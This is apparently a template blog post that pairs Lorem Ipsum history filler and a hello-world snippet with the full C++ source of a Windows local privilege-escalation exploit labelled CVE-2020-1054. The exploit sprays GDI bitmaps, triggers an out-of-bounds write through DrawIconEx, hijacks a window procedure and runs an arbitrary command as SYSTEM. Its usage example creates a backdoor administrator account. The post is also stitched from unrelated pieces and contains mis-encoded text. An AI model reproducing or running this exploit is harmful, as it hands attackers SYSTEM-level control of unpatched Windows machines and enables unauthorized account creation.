---
layout: post
---

Contrary to popular belief, Lorem Ipsum is not simply random text. It has roots in a piece of classical Latin literature from 45 BC, making it over 2000 years old. Richard McClintock, a Latin professor at Hampden-Sydney College in Virginia, looked up one of the more obscure Latin words, consectetur, from a Lorem Ipsum passage, and going through the cites of the word in classical literature, discovered the undoubtable source. Lorem Ipsum comes from sections 1.10.32 and 1.10.33 of "de Finibus Bonorum et Malorum" (The Extremes of Good and Evil) by Cicero, written in 45 BC. This book is a treatise on the theory of ethics, very popular during the Renaissance. The first line of Lorem Ipsum, "Lorem ipsum dolor sit amet..", comes from a line in section 1.10.32.

The standard chunk of Lorem Ipsum used since the 1500s is reproduced below for those interested. Sections 1.10.32 and 1.10.33 from "de Finibus Bonorum et Malorum" by Cicero are also reproduced in their exact original form, accompanied by English versions from the 1914 translation by H. Rackham.

```c
void main()
{
	printf("hello blog");
	return;
}
```

```cpp
#include <windows.h>
#include <stdio.h>
#include <Psapi.h>

extern "C" NTSTATUS  WndProc_fake(DWORD hWnd, DWORD msg, DWORD wParam, DWORD lParam);

typedef struct _HANDLEENTRY {
	PVOID   phead;
	PVOID   pOwner;
	BYTE    bType;
	BYTE    bFlags;
	WORD    wUniq;
} HANDLEENTRY, *PHANDLEENTRY;

typedef struct _SERVERINFO {
	WORD    wRIPFlags;
	WORD    wSRVIFlags;
	WORD    wRIPPID;
	WORD    wRIPError;
	ULONG   cHandleEntries;
} SERVERINFO, *PSERVERINFO;

typedef struct _SHAREDINFO {
	PSERVERINFO  psi;
	PHANDLEENTRY aheList;
	ULONG        HeEntrySize;
} SHAREDINFO, *PSHAREDINFO;


typedef struct _LARGE_STRING {
	ULONG Length;
	ULONG MaximumLength : 31;
	ULONG bAnsi : 1;
	PVOID Buffer;
} LARGE_STRING, *PLARGE_STRING;

typedef struct _PEB
{
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
	union
	{
		BOOLEAN BitField;
		struct
		{
			BOOLEAN ImageUsesLargePages : 1;
			BOOLEAN IsProtectedProcess : 1;
			BOOLEAN IsLegacyProcess : 1;
			BOOLEAN IsImageDynamicallyRelocated : 1;
			BOOLEAN SkipPatchingUser32Forwarders : 1;
			BOOLEAN SpareBits : 3;
		};
	};
	HANDLE Mutant;

	PVOID ImageBaseAddress;
	PVOID Ldr;
	PVOID ProcessParameters;
	PVOID SubSystemData;
	PVOID ProcessHeap;
	PRTL_CRITICAL_SECTION FastPebLock;
	PVOID AtlThunkSListPtr;
	PVOID IFEOKey;
	union
	{
		ULONG CrossProcessFlags;
		struct
		{
			ULONG ProcessInJob : 1;
			ULONG ProcessInitializing : 1;
			ULONG ProcessUsingVEH : 1;
			ULONG ProcessUsingVCH : 1;
			ULONG ProcessUsingFTH : 1;
			ULONG ReservedBits0 : 27;
		};
		ULONG EnvironmentUpdateCount;
	};
	union
	{
		PVOID KernelCallbackTable;
		PVOID UserSharedInfoPtr;
	};
} PEB, *PPEB;

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _TEB
{
	NT_TIB NtTib;
	PVOID EnvironmentPointer;
	CLIENT_ID ClientId;
	PVOID ActiveRpcHandle;
	PVOID ThreadLocalStoragePointer;
	PPEB ProcessEnvironmentBlock;
	ULONG LastErrorValue;
	ULONG CountOfOwnedCriticalSections;
	PVOID CsrClientThread;
	PVOID Win32ThreadInfo;
}TEB, *PTEB;


PBYTE pManagerObj = nullptr;
PBYTE pWorkerObj = nullptr;

HBITMAP hManager = 0;
HBITMAP hWorker = 0;

#ifdef _WIN64
typedef void*(NTAPI *lHMValidateHandle)(HANDLE h, int type);
#else
typedef void*(__fastcall *lHMValidateHandle)(HANDLE h, int type);
#endif

lHMValidateHandle pHmValidateHandle = NULL;

BOOL FindHMValidateHandle() {
	HMODULE hUser32 = LoadLibraryA("user32.dll");
	if (hUser32 == NULL) {
		printf("Failed to load user32");
		return FALSE;
	}

	BYTE* pIsMenu = (BYTE *)GetProcAddress(hUser32, "IsMenu");
	if (pIsMenu == NULL) {
		printf("Failed to find location of exported function 'IsMenu' within user32.dll\n");
		return FALSE;
	}
	unsigned int uiHMValidateHandleOffset = 0;
	for (unsigned int i = 0; i < 0x1000; i++) {
		BYTE* test = pIsMenu + i;
		if (*test == 0xE8) {
			uiHMValidateHandleOffset = i + 1;
			break;
		}
	}
	if (uiHMValidateHandleOffset == 0) {
		printf("Failed to find offset of HMValidateHandle from location of 'IsMenu'\n");
		return FALSE;
	}

	unsigned int addr = *(unsigned int *)(pIsMenu + uiHMValidateHandleOffset);
	unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;
	//The +11 is to skip the padding bytes as on Windows 10 these aren't nops
	pHmValidateHandle = (lHMValidateHandle)((ULONG_PTR)hUser32 + offset + 11);
	return TRUE;
}





int main()
{


	int argc = 0;
	wchar_t **argv = CommandLineToArgvW(GetCommandLineW(), &argc);
	puts("CVE-2020-1054-exploit");
	if (argc != 2)
	{
		printf("Usage: %S command\nExample: %S \"net user admin admin /ad & net user localgroup administrators admin /ad\"", argv[0], argv[0]);
		return -1;
	}

	system("pause");
	LoadLibrary(L"user32.dll");


	//exploit dc
	HDC exploit_dc = CreateCompatibleDC(0x0);


	PBYTE pExpBitmapObj = 0;


	HBITMAP hExploitBit = CreateCompatibleBitmap(exploit_dc, 0x51500, 0x100);


	printf("[+]hExploitBit Handle address: %p\n", hExploitBit);


	PTEB Teb = NtCurrentTeb();
	PPEB Peb = Teb->ProcessEnvironmentBlock;
	if (Peb == NULL)
	{
		return FALSE;
	}

	printf("[+]Peb Pointer address : %p\n", Peb);
	PBYTE  GdiSharedHandleTable = *(PBYTE *)((ULONGLONG)Peb + 0xF8);
	if (GdiSharedHandleTable == NULL)
	{
		return FALSE;
	}
	printf("[+]GdiSharedHandleTable Pointer address: %p\n", GdiSharedHandleTable);


	//��ȡ ©������ �ں˵�ַ
	pExpBitmapObj = *(PBYTE *)((ULONGLONG)GdiSharedHandleTable + sizeof(HANDLEENTRY) * (((ULONGLONG)hExploitBit) & 0xffff));

	printf("[+]dwExpBitmapObj Lookup address: %p\n", pExpBitmapObj);



	PBYTE oob_target =(PBYTE)((DWORD64)pExpBitmapObj & 0xfffffffffff00000) + 0x0000000100000000;

	printf("[+]oob_target  address: %p\n", oob_target);





	HDC alloc_dc = CreateCompatibleDC(0x0);



	DWORD64 extra_alloc = 0;

	while (true)
	{


		HBITMAP hBitMap = CreateCompatibleBitmap(alloc_dc, 0x6f000, 0x8);


		PBYTE pBitMapObj = *(PBYTE *)((ULONGLONG)GdiSharedHandleTable + sizeof(HANDLEENTRY) * (((ULONGLONG)hBitMap) & 0xffff));


		if (pBitMapObj == 0) {
			printf("[-] Ran out of memory allocating Bitmaps");
			return 1;
		}

		if ((pBitMapObj >= oob_target) && (((DWORD64)pBitMapObj & 0x0000000000070000) == 0x70000))
		{
			pManagerObj = pBitMapObj;
		
			hManager = hBitMap;

			printf("[+] Find hManager = %p\n", pManagerObj);

		}


		if (pManagerObj > 0)
		{
			
			if (extra_alloc == 1)
			{
				pWorkerObj = pBitMapObj;
				hWorker = hBitMap;
				printf("[+] Find hWorker   = %p\n", pWorkerObj);
			}
		
			if (extra_alloc > 1)
			{
				break;
			}
			extra_alloc += 1;
		}

	};

	printf("[+] GetBitMapBits/Reading using oob_target...\n");


	SelectObject(exploit_dc, hExploitBit);

	//0xfffffffffebffffc
	printf("TriggerExploit\n");



	DrawIconEx(exploit_dc, 0x900, 0xb, (HICON)0x40000010003, 0x0, 0xffe00000, 0x0, 0x0, 0x1);
	


	printf("Creating ExploitWnd\n");


	if (!FindHMValidateHandle()) {
		printf("[!] Failed to locate HmValidateHandle, exiting\n");
		return 1;
	}


	WNDCLASSEX wcx = {};

	wcx.cbSize = sizeof(WNDCLASSEX);

	wcx.lpfnWndProc = DefWindowProc;

	wcx.lpszClassName = L"hongye";

	RegisterClassEx(&wcx);

	HWND hExploitwnd = CreateWindowEx(WS_EX_CLIENTEDGE, L"hongye", L"hongye", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 240, 120, NULL, NULL, NULL, NULL);

	if (hExploitwnd == NULL)
	{
		printf("[!] CreateWindowEx error 0x%x!\n", GetLastError());
		return 3;
	}
	ULONG_PTR off_tagWND_pself = 0x20;
	char* lpUserDesktopHeapWindow = (char*)pHmValidateHandle(hExploitwnd, 1);
	ULONG_PTR	tagWND = *(ULONG_PTR*)(lpUserDesktopHeapWindow + off_tagWND_pself);

	printf("[*] tagWND: 0x%p\n", tagWND);



	ULONG cb = (ULONG)(pWorkerObj + 0x50 - (pManagerObj + 0x238));
	//0x6fe18


	//ULONG cb = 0x6fe18;
	auto pvbits = malloc(cb);


	DWORD dwRet = 0;


	printf("hManager 0x%p\n", hManager);

	printf("hWorker  0x%p\n", hWorker);

	dwRet = GetBitmapBits(hManager, cb, pvbits);
	printf("[!] GetBitmapBits error 0x%x!\n", GetLastError());


	dwRet = SetBitmapBits(hManager, cb + sizeof(ULONG_PTR), pvbits);

	*(PULONG_PTR)((PBYTE)pvbits + cb) = (ULONG_PTR)tagWND + 0x90;
	SetBitmapBits(hManager, cb + sizeof(ULONG_PTR), pvbits);
	ULONG_PTR data = (ULONG_PTR)WndProc_fake;
	SetBitmapBits(hWorker, sizeof(ULONG_PTR), (void*)&data);
	SendMessage(hExploitwnd, WM_NULL, NULL, NULL);


	SECURITY_ATTRIBUTES		sa;
	HANDLE					hRead, hWrite;
	byte					buf[40960] = { 0 };
	STARTUPINFOW			si;
	PROCESS_INFORMATION		pi;
	DWORD					bytesRead;
	RtlSecureZeroMemory(&si, sizeof(si));
	RtlSecureZeroMemory(&pi, sizeof(pi));
	RtlSecureZeroMemory(&sa, sizeof(sa));
	int br = 0;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
	if (!CreatePipe(&hRead, &hWrite, &sa, 0))
	{
		return -3;
	}
	wprintf(L"[*] Trying to execute %s as SYSTEM\n", argv[1]);
	si.cb = sizeof(STARTUPINFO);
	GetStartupInfoW(&si);
	si.hStdError = hWrite;
	si.hStdOutput = hWrite;
	si.wShowWindow = SW_HIDE;
	si.lpDesktop = L"WinSta0\\Default";
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	wchar_t cmd[4096] = { 0 };
	lstrcpyW(cmd, argv[1]);
	
	if (!CreateProcessW(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
	{
		CloseHandle(hWrite);
		CloseHandle(hRead);
		printf("[!] CreateProcessW Failed![%lx]\n", GetLastError());
		return -2;
	}
	CloseHandle(hWrite);
	printf("[+] ProcessCreated with pid %d!\n", pi.dwProcessId);
	while (1)
	{
		if (!ReadFile(hRead, buf + br, 4000, &bytesRead, NULL))
			break;
		br += bytesRead;
	}
	puts("===============================");
	puts((char*)buf);
	fflush(stdout);
	fflush(stderr);
	CloseHandle(hRead);
	CloseHandle(pi.hProcess);
	ExitProcess(0);

	return 0;
}
```

